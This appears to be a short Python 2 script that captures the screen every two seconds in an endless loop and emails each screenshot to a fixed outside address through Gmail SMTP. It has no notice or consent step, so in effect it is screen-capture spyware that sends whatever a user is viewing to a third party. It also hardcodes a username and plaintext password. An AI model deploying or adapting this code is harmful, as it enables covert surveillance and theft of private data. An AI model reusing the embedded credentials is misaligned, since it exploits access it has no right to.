import time
import sys
from PIL import Image
from PIL import ImageGrab 

# email related imports
import smtplib
import mimetypes
import email
import email.mime.application
import zipfile


#default variables
runState = True;
fromaddr = 'anurag@gmail.com';
username = 'anurag@techvalens.com'
password = 'Anu123rag!!'
toaddrs  = 'sanchay.shukla@techvalens.com'


# Captures the screen 
def captureScreen():
	timestr = time.strftime("%Y%m%d-%H%M%S");
	ImageGrab.grab().save(timestr+'.jpg', "JPEG");
	sendEmailWithAttachment(timestr+'.jpg');
	return


# Send captured data on email
def sendEmail():
	
	msg = 'There was a terrible error that occured and I wanted you to know!'

	# The actual mail send
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(username,password)
	server.sendmail(fromaddr, toaddrs, msg)
	server.quit()	
	return

def sendEmailWithAttachment(filename):
	# Create a text/plain message
	msg = email.mime.Multipart.MIMEMultipart()
	msg['Subject'] = 'Screen Captured'
	msg['From'] = fromaddr
	msg['To'] = toaddrs

	# The main body is just another attachment
	body = email.mime.Text.MIMEText("")
	msg.attach(body)

	# PDF attachment
	fp=open(filename,'rb')
	att = email.mime.application.MIMEApplication(fp.read(),_subtype="JEPG")
	fp.close()
	att.add_header('Content-Disposition','attachment',filename=filename)
	msg.attach(att)

	# send via Gmail server
	# NOTE: my ISP, Centurylink, seems to be automatically rewriting
	# port 25 packets to be port 587 and it is trashing port 587 packets.
	# So, I use the default port 25, but I authenticate. 
	s = smtplib.SMTP('smtp.gmail.com')
	s.starttls()
	s.login(username,password)
	s.sendmail(fromaddr,toaddrs, msg.as_string())
	s.quit()
	return
	
# start
def start():
	print runState;
	while(runState):
		time.sleep(2);
		captureScreen();
	return

start();


